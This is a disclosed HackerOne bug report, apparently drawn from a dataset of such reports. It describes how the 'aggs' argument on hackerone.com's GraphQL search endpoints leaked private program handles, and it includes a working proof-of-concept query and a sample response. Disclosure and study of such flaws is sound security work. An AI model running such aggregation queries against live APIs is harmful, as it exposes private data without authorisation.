---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1838329'
original_report_id: '1838329'
title: Private information exposed through GraphQL search endpoints aggregates
weakness: Information Disclosure
team_handle: security
created_at: '2023-01-18T13:13:54.660Z'
disclosed_at: '2023-01-19T16:04:16.134Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 28
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Private information exposed through GraphQL search endpoints aggregates

## Metadata

- HackerOne Report ID: 1838329
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2023-01-19T16:04:16.134Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**

Private information can be exposed using `aggs` argument on the `search` and `opportunities_search` endpoints on the GraphQL root node.  

**Description:**

When using the `aggs` argument and return field on the `search` and `opportunities_search` endpoints, the data returned in the `aggs` can potentially contain private information. It can for example be used to expose handles of private programs, and other data that can be aggregated by. 
 
### Steps To Reproduce

Specific example to expose private team handles, but other things can be exposed in the same way using this or other indexes on the `search` endpoint.

1.  Open and run any GraphQL client, or modify an existing GraphQL request
2.  Run a query with an aggregate for a field which could contain private information. The provided query can be tweaked to get more specific results.
```
# Write your query or mutation here
query {
  me {
    id
  }
  opportunities_search(query:{}, aggs:{results:{terms: {field:"handle"}}}) {
    aggs
  }
}
```

3.  The output will show aggregations by the `handle` which are not filtered on whether they are private or not. 

```
{
  "data": {
    "me": null,
    "opportunities_search": {
      "aggs": {
        "results": {
          "doc_count_error_upper_bound": 0,
          "sum_other_doc_count": 37,
          "buckets": [
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            }
          ]
        }
      }
    }
  }
}
```

## Impact

Impact depends on what information is stored in which index, and which fields can be aggregated by. In the current situation at least allows to expose asset information, handles and other information of teams you don't have access to.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
